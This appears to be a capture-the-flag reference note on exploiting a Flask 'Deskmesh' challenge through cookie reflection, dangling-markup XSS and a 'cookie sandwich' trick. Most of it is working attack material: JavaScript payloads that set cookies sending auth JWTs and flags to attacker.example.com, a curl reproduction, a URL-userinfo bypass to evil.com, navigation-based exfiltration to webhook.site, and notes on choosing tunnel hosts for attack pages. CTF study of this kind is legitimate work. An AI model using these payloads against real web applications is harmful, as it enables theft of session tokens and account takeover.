# Deskmesh-style Cookie Reflection + Dangling Markup XSS

## Pattern: Cookie value reflected with `|safe` in Jinja2 template

When a Flask app:
1. Reads a cookie value: `request.cookies.get("banner")`
2. Renders it with `{{ banner | safe }}` (unescaped) in a template
3. Has CSP allowing `img-src http: https:` on that page

### Dangling Markup Injection via Cookie

Set the cookie value to an unclosed `<img src="https://attacker/exfil?d=` tag.
The browser captures all subsequent HTML (including secrets/flags) into the img `src` attribute until the next `"` quote character in the page source.

Template:
```html
<p>{{ banner | safe }}</p>
...
{% if flag %}<p>{{ flag }}</p>{% endif %}
```

With banner = `<img src="https://attacker/exfil?d=`, the rendered HTML becomes:
```html
<p><img src="https://attacker/exfil?d=</p>
...
<p>FLAG{...}</p>
...
<footer class="site-footer">
```
The img src captures everything up to the next `"` in the source.

### Cookie Priority (Flask/Werkzeug)

When multiple cookies share the same name in the `Cookie:` header:
- **Flask picks the FIRST** one (ImmutableMultiDict.get returns first occurrence)
- Chrome orders same-name, same-path cookies by **creation time (oldest first)** per RFC 6265 §5.4
- An HttpOnly cookie set by the server (older) comes BEFORE a JS-set cookie (newer)

### Cookie Jar Overflow to Evict HttpOnly Cookie

Chrome allows ~180 cookies per eTLD+1. To evict an existing HttpOnly cookie:
1. From JS on the same origin, set 180+ dummy cookies (e.g., `document.cookie = "x0=y; x1=y; ..."`)
2. Chrome evicts **oldest cookies first** (including HttpOnly ones)
3. Then set your malicious cookie: `document.cookie = "banner=<img src=https://attacker/exfil?d=; path=/status"`
4. Navigate the browser to the page that reflects the cookie

**Bootstrap problem:** cookie jar overflow requires JS execution on the same origin. To get JS, you need an XSS sink that doesn't require custom HTTP headers (CRLF injection used to provide this, but is blocked in Chrome 88+). Without bootstrap, you can NOT overflow cookies and the dangling-markup exfil does not trigger.

### Cookie Sandwich via Unclosed Quote (banner eats auth JWT in Cookie header)

**Pattern:** When two cookies share a name and a page renders the FIRST cookie's value with `{{ value | safe }}` AND there's a same-origin HttpOnly cookie (e.g. `auth`) sent in between, an unclosed quote in cookie #1 + closing quote in cookie #2 makes Werkzeug read past the `;` separator and include the auth JWT in cookie #1's value.

**Why this works:** Per RFC 6265, a cookie value can be a `DQUOTE *cookie-octet DQUOTE` (quoted-string). When the first banner cookie value STARTS with `"` but has no matching closing `"` in its literal value, Werkzeug's permissive parser scans forward through subsequent `;`-separated pairs looking for a matching `"`. The second cookie (`banner='>"` with `path=/`) provides that closing quote. Everything between the two quotes — including the intervening `auth=<JWT>` cookie — is parsed as a single cookie value.

**Payload (executed on 127.0.0.1:7000 after bootstrap XSS, with valid admin session in same browser):**
```javascript
var u = "http://attacker.example.com/exfil";
document.cookie = 'banner="' + encodeURIComponent("<img src='" + u + "/?x=") + '; path=/status';
document.cookie = 'banner=' + encodeURIComponent("'>") + '"; path=/';
location = "http://127.0.0.1:7001/status";
```

**Resulting Cookie header on the navigation to 127.0.0.1:7001/status:**
```
Cookie: banner="<img src='http://attacker.example.com/exfil?x=; auth=eyJhbG...NiIs...; banner='>"
```

**Resulting banner value after Werkzeug parse + `unquote_plus()`:**
```
<img src='http://attacker.example.com/exfil?x=; auth=eyJhbG...NiIs...
```

**Rendered HTML (banner is `|safe`):**
```html
<p><img src='http://attacker.example.com/exfil?x=; auth=eyJhbG...NiIs...</p>
  <p>FLAG2_IN_HERE</p>
  <footer>Signed in as agent: "<code>admin</code>"</footer>
```

The `src=` attribute is single-quoted and unclosed. Browser scans forward to the next `'` or `"`. The next `"` is in the agent footer (`agent: "<code>..."`). Browser makes a GET to:
```
http://attacker.example.com/exfil?x=; auth=eyJhbG...NiIs...&flag2=...; banner=
```

JWT + flag2 exfil in one image request.

**Verified parsing primitive directly:** synthetic `Cookie: banner="<img src='http://127.0.0.1:8123/?x=; auth=JWT.TEST.TOKEN; banner='>"` against `/status` returns:
```html
<p><img src='http://127.0.0.1:8123/?x=; auth=JWT.TEST.TOKEN; banner='></p>
```

The dangling `'` in the second banner value is what closes the img src. The auth JWT is captured in the URL.

**No flag2 required in the path** — the same trick captures the flag rendered in the `<p>{{ flag }}</p>` block too. The "banner eats everything between the quotes" property is what makes this a one-shot full-exfil payload.

**Precondition:** Same-origin JS on 127.0.0.1 to set the cookies. The bootstrap (XSS on 127.0.0.1) is the missing piece — the downstream extraction is deterministic once you have JS execution.

**Quirk:** The second `banner` cookie has `path=/` (not `/status`). The first `banner` has `path=/status`. On the navigation to 7001/status, BOTH match the path and are sent. That's the entire trick — two different paths send two banner cookies that Werkzeug merges into one logical value.

**Why this beats the cookie-jar-overflow variant:** No need to evict the existing HttpOnly `banner` cookie (which the server sets on `/status` with `path=/status; httponly=True`). The two `banner` cookies with different paths are sent together on the navigation; Werkzeug's parser treats the unclosed `"` as a quoted-string opening and reads until the second banner's `"`. The HttpOnly cookie from the server is gone (path=/status) but it doesn't matter — the new `banner=<img src=...` with `path=/status` is the SAME PATH as the server's, and since we set a new value, it OVERWRITES the server's banner cookie in the cookie jar anyway.

**Curl reproduction (test the parsing directly without a bot):**
```bash
curl -H $'Cookie: banner="<img src=\'http://127.0.0.1:8123/?x=; auth=JWT.TEST.TOKEN; banner=\'>"' \
     http://target:7001/status | grep "img src"
# → <p><img src='http://127.0.0.1:8123/?x=; auth=JWT.TEST.TOKEN; banner='></p>
```

If you see `auth=...` in the output, the cookie sandwich primitive is working on that target.

### Cookie Scope: Ports Share Cookies

Cookies are NOT port-scoped. A cookie set on `127.0.0.1:7000` is sent to `127.0.0.1:7001`.
This means XSS on one port can poison cookies read by another port's service.

### URL Userinfo Bypass for Bot URL Validation

If a bot validates `url.startswith("http://127.0.0.1:7000")`:
- `http://127.0.0.1:7000@evil.com/path` passes the check
- Browser navigates to `evil.com/path` (treating `127.0.0.1:7000` as userinfo)
- Use for navigating bot to attacker-controlled page

**Verified working** (Chrome 147 + Chromium 149, June 2026).

### Private Network Access (PNA) Considerations

- Chrome blocks **subresource** requests (fetch/XHR) from public HTTPS to private IPs
- Chrome does NOT block **top-level navigation** to private IPs
- `document.cookie` assignment is a DOM operation, NOT restricted by CSP `connect-src`
- `window.location` navigation is NOT restricted by CSP

### Flask API Content-Type Sink

When Flask's `make_response(json.dumps({...}))` is called without explicit content_type:
- Response Content-Type defaults to `text/html`
- If CSP has `script-src 'unsafe-inline'`, `<script>` tags in the JSON body execute
- Combined with the fallback CSP pattern (applied when handler doesn't set CSP), this creates an XSS sink

### DOMPurify 3.3.1 — what actually works (verified June 2026)

**The "DOMPurify 3.3.1 mXSS" claim in older writeups is misleading for Chrome.** Specifically:

- **CVE-2025-26791** (`<math>/<table>/<mglyph>/<style>` namespace confusion): requires `SAFE_FOR_TEMPLATES: true` + `CUSTOM_ELEMENT_HANDLING`. Queue page uses default config → does NOT fire.
- **GHSA-87xg-pxx2-7hvx** (selectedcontent re-clone): affects DOMPurify **3.4.4**+ (where `selectedcontent` is in default ALLOWED_TAGS). Queue page uses **3.3.1** → not vulnerable. The reference's claim that this works on 3.3.1 is incorrect.
- **Test case 102** (backtick-script): the alleged bypass `<img src="x` `<script>alert(102)</script>\">` HTML-encodes to `&lt;script&gt;` in Chrome 147 — does NOT fire alert. The bypass works only in jsdom or older parsers, NOT in current Chromium.
- **All standard mXSS payloads** (`<noscript>` comment close, `<xmp>` title close, attribute-comment, etc.) sanitize to safe output in Chrome 147 + DOMPurify 3.3.1 default config.

**Even if a mXSS did fire, the queue page's CSP blocks code execution:**
- `script-src 'nonce-...'` blocks all event handlers and inline `<script>` (no `'unsafe-inline'`)
- `default-src 'none'` blocks `<img src=...>` (dangling markup useless)
- `base-uri` defaults to `default-src 'none'` → blocks `<base href=...>` redirects
- `form-action` defaults to `default-src 'none'` → blocks `<form action="...">` exfiltration
- Only useful injection: `<meta http-equiv="refresh">` (navigation only, no data exfil)

**Detection:** Check `/static/purify.js` version string. DOMPurify 3.3.1 header: `/*! @license DOMPurify 3.3.1 ...*/`. If the challenge's `purify.js` is exactly 3.3.1 (not 3.4.x), do not trust writeups claiming mXSS via selectedcontent or backtick-script.

### Attack Chain Summary (Deskmesh, corrected after author writeup)

The full intended chain is verified locally on Chromium 149:

1. **Bootstrap same-origin JS on 127.0.0.1:7000** with rendered-API cache choreography:
   - Bot is sent to attacker `/s1` via URL userinfo bypass.
   - `/s1` opens `/queue`, which performs the admin-authenticated `fetch('/api/tickets/<id>', {X-Desk-Action:view})` and primes the cached `text/html` API response.
   - `/s1` navigates itself to a `blob:` page that calls `history.back()`.
   - Second `/s1` hit returns `302` to `/api/tickets/<id>`; Chrome renders the cached response as a document and executes the stored ticket `<script>` under fallback `script-src 'unsafe-inline'`.
2. **Flag 1:** use quoted-cookie sandwich to fold the HttpOnly `auth` JWT (after `/escalate` adds `clearance`) into reflected `banner`, then leak via an image request.
3. **Flag 2:** first evict the protected HttpOnly `/status` banner cookie; set attacker `banner=<meta charset='ISO-2022-JP'><img src=...%1B%24%40`; use a username ending in ESC `(B` to return to ASCII and terminate the image URL. The loopback-only `<p>HYNX{...}</p>` status flag is folded into the image URL.

**Local reproducer:** `/home/nuzhmi/Desktop/ctf-codex/deskmesh-support-flag-1/scripts/solve_writeup_local.py` (`DESKMESH_CHAIN=flag1` or `flag2`).

### See also
- `references/deskmesh-flask-dual-port.md` — full architecture and bot flow
- `references/deskmesh-patterns.md` — broader pattern catalog
- `references/deskmesh-actual-exploitability-2026.md` — full empirical session log
- `references/dompurify-3.3.1-mxss-verification.md` — CDN URL gotcha + local test setup

## Update 2026-06-22: cache replay attempt failed, infra notes

**Teammate's bootstrap hypothesis tested and BROKEN in Chrome 142/149:**

The teammate's exploit (per Slack message, June 22 2026) was:
1. Stored XSS via ticket body
2. The `/queue` page's `api()` function fetches `/api/tickets/<id>` with `X-Desk-Action: view` → response cached as text/html
3. Bot later navigates to `target_url = http://127.0.0.1:7000/api/tickets/<id>` → browser reuses cache → body renders as HTML → script fires
4. Script sets cookie sandwich on banner → navigates to 7001/status → exfil

**Empirical test (Chrome 142 local, June 22 2026):**
- Local server returns DIFFERENT responses based on `X-Test` header (mimicking the X-Desk-Action check)
- `fetch('/api/data', {headers: {'X-Test': 'cached'}})` then `location.href = '/api/data'`
- Server log shows: 1st request with `X-Test=cached`, 2nd request with `X-Test=NONE` (no cache reuse)
- **Conclusion: Chrome does NOT reuse the fetch cache for top-level navigation. Cache replay is broken.**

**Empirical test (Chrome 149 live, June 22 2026):**
- Submitted bot with `target_url = http://127.0.0.1:7000/api/tickets/<uuid>` (direct path)
- XSS payloads tried: `<script>location='https://webhook.site/...'</script>`, `<meta http-equiv="refresh" content="0;url=...">`, `<img src="...">` (CSP blocks img)
- 0 hits on webhook.site for all attempts
- **Conclusion: Cache replay does NOT work on live Chrome 149 either.**

**Why the cache replay fails (technical):**
- Flask's `make_response` without mimetype returns `text/html` (default)
- No `Cache-Control`, no `Last-Modified`, no `ETag` on the response
- Without these, browser considers the response stale immediately
- For top-level navigation, browser issues a fresh request → no `X-Desk-Action` header → 400

**The teammate might be wrong, or testing on a different Chrome version with different cache behavior. Trust local empirical evidence over teammate claims.**

## Update 2026-06-22: tunnel infrastructure for bot @-userinfo

**Service matrix tested for hosting bot @-userinfo exploit page:**

| Service | HTTP:80 | Custom HTML | Bot reach | Verdict |
|---|---|---|---|---|
| cloudflared quick tunnel | ❌ 501 | ✅ yours | ❌ 501 | Dead for HTTP bot URLs (HSTS doesn't help because URL is `http://`, not `https://`) |
| ngrok free | ❌ 307→HTTPS | ✅ yours | ⚠️ inconsistent (curl follows, Chrome 149 doesn't reliably) | Risky |
| webhook.site | ✅ HTTP+HTTPS | ❌ logs only | ✅ confirmed 1 hit | Best for canary/exfil. Can NOT host custom JS without API key |
| serveo.net (SSH) | ✅ HTTP | ✅ yours | ❌ SSH hangs, HTTP 502 | Unusable |
| localtunnel (npm) | ✅ HTTP | ✅ yours | ⚠️ silent failure | Unreliable |
| catbox.moe | HTTPS via HSTS | ✅ yours | ✅ HSTS upgrade | CSP blocks exfil img-src |

**Best bet for the bootstrap: webhook.site as canary (1 hit confirmed) + exfil endpoint via navigation.** For actual exploit HTML hosting, need Cloudflare Workers with a custom account, or a tunnel that supports BOTH HTTP and HTTPS (rare in free tier).

**Mixed content caveat:** If the bot URL is `http://...@HOST`, the browser tries HTTP first. webhook.site and catbox.moe work because they auto-upgrade to HTTPS (HSTS preload or 307 redirect). The 307 redirect from ngrok-free.dev and others is what sometimes fails on Chrome 149.

**Navigation-based exfil bypasses CSP:** `location = 'https://webhook.site/UUID/?d=' + encodeURIComponent(...)` is NOT blocked by `default-src 'none'` (no navigation directive in the fallback CSP). This is the only exfil method that works on the /api/tickets/<id> response.
